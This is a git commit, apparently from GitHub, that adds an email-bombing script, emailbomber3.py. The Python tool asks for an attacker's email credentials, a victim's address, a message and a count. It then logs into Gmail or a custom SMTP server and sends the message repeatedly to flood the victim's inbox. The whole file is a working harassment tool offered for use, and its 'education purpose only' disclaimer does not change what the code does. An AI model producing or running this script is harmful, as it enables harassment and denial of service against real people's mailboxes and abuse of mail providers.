479ce95bbe26b2355e34af8c2d9b005680216ad7
Asynchronous Anomaly <81502910+Nocturnal-Compiler@users.noreply.github.com>
2024-03-01 17:32:12 +0530

    Add files via upload

---
+++ emailbomber3.py
@@ -0,0 +1,72 @@
+#!/usr/bin/python3
+#E-bomber
+#This code for education purpose only.
+#Use it at your own risk !!!
+# Python 3 rewrite by Omicron166
+
+from os import urandom
+import smtplib
+from getpass import getpass
+from simple_chalk import chalk, green
+import sys
+from time import sleep
+
+
+print('                                                                    ')
+print('                                                                    ')
+print("$$$$$$$$\                      $$\$$\       $$$$$$$\                       $$\                         ")
+print("$$  _____|                     \__$$ |      $$  __$$\                      $$ |                        ")
+print("$$ |     $$$$$$\$$$$\  $$$$$$\ $$\$$ |      $$ |  $$ |$$$$$$\ $$$$$$\$$$$\ $$$$$$$\  $$$$$$\  $$$$$$\  ")
+print("$$$$$\   $$  _$$  _$$\ \____$$\$$ $$ |      $$$$$$$\ $$  __$$\$$  _$$  _$$\$$  __$$\$$  __$$\$$  __$$\ ")
+print("$$  __|  $$ / $$ / $$ |$$$$$$$ $$ $$ |      $$  __$$\$$ /  $$ $$ / $$ / $$ $$ |  $$ $$$$$$$$ $$ |  \__|")
+print("$$ |     $$ | $$ | $$ $$  __$$ $$ $$ |      $$ |  $$ $$ |  $$ $$ | $$ | $$ $$ |  $$ $$   ____$$ |      ")
+print("$$$$$$$$\$$ | $$ | $$ \$$$$$$$ $$ $$ |      $$$$$$$  \$$$$$$  $$ | $$ | $$ $$$$$$$  \$$$$$$$\$$ |      ")
+print("\________\__| \__| \__|\_______\__\__|      \_______/ \______/\__| \__| \__\_______/ \_______\__|      ")
+print('\n\n')
+print("")
+user = input(chalk.green('Anonymous name: '))
+email = input(chalk.green('\nAttacker Email Address: '))
+passwd = getpass(chalk.green.bold('\nAttacker Email Password: '))
+to = input(chalk.red('\nVictim Email Address: '))
+total = input('\nNumber of emails: ')
+body = input('\nMessage: ')
+Cserver = input('\nCustom smtp server (leave blank to use gmail): ')
+
+if not Cserver == '':
+    defaultconf = False
+    smtp_server = Cserver
+    Cport = input('Custom smtp port (leave blank to use defaul port): ')
+    if not Cport == '':
+        port = int(Cport)
+    else:
+        port = 587
+else:
+    smtp_server = 'smtp.gmail.com'
+    port = 587
+    defaultconf = True
+
+
+try:
+    server = smtplib.SMTP(smtp_server, port)
+    server.ehlo()
+    server.starttls()
+    server.login(email, passwd)
+    for i in range(1, int(total) + 1):
+        subject = urandom(9)
+        msg = 'From: ' + user + '\nMessage: ' + '\n' + body
+        server.sendmail(email, to, msg)
+        print("\rE-mails sent: %i" % i)
+        sleep(1)
+        sys.stdout.flush()
+    server.quit()
+    print('\n Done !!!')
+    sys.exit()
+except KeyboardInterrupt:
+    print(chalk.red('[-] Canceled'))
+    sys.exit()
+except smtplib.SMTPAuthenticationError:
+    print(chalk.red.bold('[!] The username or password you entered is incorrect'))
+    sys.exit()
+except smtplib.SMTPConnectError:
+    print(chalk.red.bold('\n[!] Failed to connect with the SMTP server'))
+    sys.exit()
